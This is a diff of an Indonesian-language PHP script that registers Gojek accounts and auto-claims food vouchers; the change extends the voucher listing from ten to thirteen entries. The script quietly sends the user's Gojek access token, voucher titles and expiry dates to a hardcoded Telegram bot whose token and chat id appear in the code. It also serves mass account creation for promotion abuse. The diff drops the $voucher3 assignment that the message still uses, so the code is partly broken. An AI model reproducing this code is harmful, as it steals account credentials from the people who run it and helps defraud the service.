@@ -5,10 +5,10 @@ echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
 echo "\e[92m| __\e[93mDaftar\e[92m_\e[93mAkun\e[92m_\e[93m+\e[92m_\e[93mAuto\e[92m_\e[93mClaim\e[92m_\e[93mVoucher\e[92m_\e[93mFood\e[92m__|\n";
 echo "\e[92m| ___________\e[93m•_+\e[92m_\e[93mBuat\e[92m_\e[93mPIN\e[92m_\e[93m-_•\e[92m______________|\n";
 echo "\e[92m| _\e[91mUNTUK\e[92m_\e[91mREGISTRASI\e[92m_\e[91mSILAHKAN\e[92m_\e[91mHUBUNGI\e[92m_\e[91mADMIN\e[92m_|\n";
-echo "\e[92m| ___\e[93mTELEGRAM\e[92m_\e[91m:@mang*b*y\e[92m___________________|\n";
-echo "\e[92m| ___\e[93mGITHUB\e[92m___\e[91m:github.com/mrubay\e[92m___________|\n";
-echo "\e[92m| ___\e[93mVersion\e[92m__\e[91m:∆UBUR\e[92m_\e[93m-\e[92m_\e[93mUBUR\e[92m_\e[93m21∆\e[92m____________|\n";
-echo "\e[92m| ___\e[93mTime\e[92m_____\e[93m:".date('[d-m-Y] [H:i:s]')."\e[92m_____|\n";
+echo "\e[92m| ___\e[93mTELEGRAM\e[92m_:\e[91m@mang*b*y\e[92m___________________|\n";
+echo "\e[92m| ___\e[93mGITHUB\e[92m___:\e[91mgithub.com/mrubay\e[92m___________|\n";
+echo "\e[92m| ___\e[93mVersion\e[92m__:\e[91m∆UBUR\e[92m_\e[91m-\e[92m_\e[91mUBUR\e[92m_\e[91m21∆\e[92m____________|\n";
+echo "\e[92m| ___\e[93mTime\e[92m_____:\e[93m".date('[d-m-Y] [H:i:s]')."\e[92m_____|\n";
 echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
 	echo "\n";
 echo "\e[92m╔══════════════════════════════════╗\n";
@@ -137,9 +137,8 @@ echo "\e[93m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         $messageboba09 = fetch_value($boba09,'"message":"','"');
         echo "\n".color("green","+] Message: ".$messageboba09);
         sleep(3);
-        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=10&page=1', $token);
+        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=13&page=1', $token);
         $total = fetch_value($cekvoucher,'"total_vouchers":',',');
-        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
         $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
         $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
         $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
@@ -149,6 +148,9 @@ echo "\e[93m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         $voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
         $voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
         $voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
+	$voucher11 = getStr1('"title":"','",',$cekvoucher,"11");
+	$voucher12 = getStr1('"title":"','",',$cekvoucher,"12");
+	$voucher13 = getStr1('"title":"','",',$cekvoucher,"13");
         echo "\n".color("white","!] Total voucher ".$total." : ");
         echo "\n".color("green","                     1. ".$voucher1);
         echo "\n".color("green","                     2. ".$voucher2);
@@ -160,6 +162,9 @@ echo "\e[93m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         echo "\n".color("green","                     8. ".$voucher8);
         echo "\n".color("green","                     9. ".$voucher9);
         echo "\n".color("green","                     10. ".$voucher10);
+	echo "\n".color("green","                     11. ".$voucher11);
+        echo "\n".color("green","                     12. ".$voucher12);
+        echo "\n".color("green","                     13. ".$voucher13);
         echo"\n";
         $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
         $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
@@ -171,9 +176,12 @@ echo "\e[93m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         $expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
         $expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
         $expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
+        $expired11 = getStr1('"expiry_date":"','"',$cekvoucher,'11');
+        $expired12 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
+        $expired13 = getStr1('"expiry_date":"','"',$cekvoucher,'13');
         $TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
 	$chatid = "785784404";
-	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."]";
+	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]";
 	$method	= "sendMessage";
 	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
 	$post = [
